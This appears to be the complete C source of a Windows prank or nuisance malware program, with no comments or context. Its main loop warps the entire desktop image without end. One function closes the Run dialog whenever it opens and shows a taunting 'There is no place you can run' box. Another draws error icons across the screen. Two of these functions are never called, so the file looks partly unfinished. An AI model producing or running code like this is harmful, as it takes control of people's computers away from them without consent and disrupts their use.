#include <windows.h>



int WinMain() {
	POINT p[3];
	while (TRUE) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		int x = rand() % 100;
		p[0].x = rect.left + 50;
		p[0].y = rect.top;
		p[1].x = rect.right + 50;
		p[1].y = rect.top + 50;
		p[2].x = rect.left - 50;
		p[2].y = rect.bottom - 50;
		PlgBlt(hdc, p, hdc, NULL, NULL, w, h, NULL, NULL, NULL);
		Sleep(1);
	}
}

DWORD Message() { return MessageBoxA(NULL, "There is no place you can run", "Windows", MB_ICONINFORMATION | MB_OK); }

int NoRun() {
	for (;;) {
		HWND hwnd = FindWindowA(NULL, "Run");
		HANDLE nb = NULL;
		if (!hwnd == NULL)
			SendMessage(hwnd, WM_CLOSE, NULL, NULL);
		else
			continue;
		nb = CreateThread(NULL, NULL, &Message, NULL, NULL, NULL);
	}
}

int parabola() {
	float a2 = 0;
	for (;;) {
		HDC hdc = GetWindowDC(GetDesktopWindow());
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		DrawIcon(hdc, rect.left + (int)a2, rect.top + (int)(sin(a2) * h), LoadIconW(NULL, IDI_ERROR));
		DrawIcon(hdc, rect.right - (int)a2, rect.top + (int)(sin(a2) * h), LoadIconW(NULL, IDI_ERROR));
		if (a2 > w/2)
			a2 = 0;
		a2 += 0.9;
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
}